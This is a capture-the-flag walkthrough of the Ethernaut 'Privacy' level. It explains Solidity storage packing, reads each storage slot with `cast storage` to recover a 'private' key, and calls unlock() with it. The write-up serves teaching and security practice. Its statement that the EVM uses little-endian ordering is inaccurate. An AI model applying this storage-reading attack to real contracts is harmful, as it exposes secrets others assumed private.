## Privacy Level Outline

**Difficulty : 8/10**

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B)

## Solution

To solve this level, we need an understanding of how contract storage slots work and how they are assigned.

- The wordsize of the EVM is equal to 256 bits (32 bytes)
    - This means that each storage slot has a capacity of 32 bytes
- Statically sized variables are laid out contigously in storage starting at slot 0
    - Statically sized variables reffer to variables with a fixed size 
- If multiple variables of size less than 32 bytes are declared one after another, they are packed into a single storage slot based on the following rules :
    - The first item in a storage slot is stored lower-order aligned (little endian ordering) 
    - If an element type does not fit in the remaining part of a storage slot, it is moved to the next storage slot
    - Structs and array data always start a new slot and occupy whole slots (items inside a struct or array are packed tightly according to the above rules)
- The elements of structs and arrays are stored after each other, just as though they were given explicitly.

##### Extra Info Not Related To Level
- Due to their unpredictable size, mapping and dynamically-sized array types use a Keccak-256 hash computation to find the starting position of the value or the array data. These starting positions are always full stack slots.
- Constant variables are stored in code not contract storage

Read more about layout of state variables in Storage from the docs [here](https://docs.soliditylang.org/en/v0.4.24/miscellaneous.html)

### Walkthrough

*Let's inspect each memory slot individually and make sense of what is going on

##### 1. Inspecting **storage slot 0**
```console
cast storage $LEVEL_ADDRESS 0
```
output 
```console
0x0000000000000000000000000000000000000000000000000000000000000001
```
we know that **storage slot 0** represents the variable `locked` as it is the first declared variable in our contrat. a value of 1 equals true which matches the value assigned to locked.

```solidity
bool public locked = true;
```
boolean types require 1 byte of storage, but because the next variable in our contract : `ID` is of type `uint256`, it takes up 32 bytes to store (a full storage slot) meaning it cannot be packed with `locked` so it stored in the next storage slot. 

##### 2. Inspecting storage slot 1
```console
cast storage $LEVEL_ADDRESS 1
```
output 
```console
0x000000000000000000000000000000000000000000000000000000006273be09
```

we know that storage slot 1 represents the variable `ID`. 

```solidity
uint256 public ID = block.timestamp;
```

this means that the data we see is the hex representation of the block's unix timestamp

##### 3. Inspecting storage slot 2
```console
cast storage $LEVEL_ADDRESS 2
```
output 
```console
0x00000000000000000000000000000000000000000000000000000000be09ff0a
```
we know that storage slot 2 represents the variables `flattening`, `denomination`, and `awkwardness` as they can be packed into a single storage slot

```solidity
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
```

remember that the evm uses little endian order when handling byte ordering so we read the memory slot from right to left

- the byte `0a` is the **uint8 variable** `flattening`. We can confirm this as the hex value `0a` is `10` in decimal
- the byte `ff` is the **uint8 variable** `denomination`. We can confirm this as the hex value `ff` is `255` in decimal
- the 2 bytes `be09` is the **uint16 variable** `akwardness`. The hex value represents the 16bit mask of the `block.timestamp`

##### 4. Inspecting storage slot 3
```console
cast storage $LEVEL_ADDRESS 3
```
output 
```console
0x44a557ce091a1a07e9a3901396684f550c3cacb7705a0fd31c8828e285faea82
```
we know that storage slot 3 represents `data[0]`, the first element of the array data

```solidity
bytes32[3] private data;
```

`data` is an array of bytes32 which means that each element takes up 32 bytes (a whole storage slot)

##### 5. Inspecting storage slot 4
```console
cast storage $LEVEL_ADDRESS 4
```
output 
```console
0x640a1bfd48f6be7abf68d08b273284d0e55ba9cfc823d8db74b24e6f486c5204
```
we know that storage slot 4 represents `data[1]`, the second element of the array data

```solidity
bytes32[3] private data;
```

##### 6. Inspecting storage slot 5
```console
cast storage $LEVEL_ADDRESS 5
```
output 
```console
0x08f99efe07ce4fbea4eee5523a0e5d66aeb986ab62a85e5e53c1400155e1ae62
```
we know that storage slot 5 represents `data[2]`, the third element of the array data

```solidity
bytes32[3] private data;
```
we need the third element of `data` to pass the level, this is the value that we are interested in

##### 7. Because the "unlock(bytes16 _key)" function expects a bytes16 variable and not a bytes32, we need to only pass the first 16 bytes of `data[2]` to the unlock function to complete this level
```console
cast send $LEVEL_ADDRESS "unlock(bytes16)" 0x08f99efe07ce4fbea4eee5523a0e5d66 --private-key $PRIVATE_KEY
```

## Further Reading
[how to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925) by Darius - A practical guide
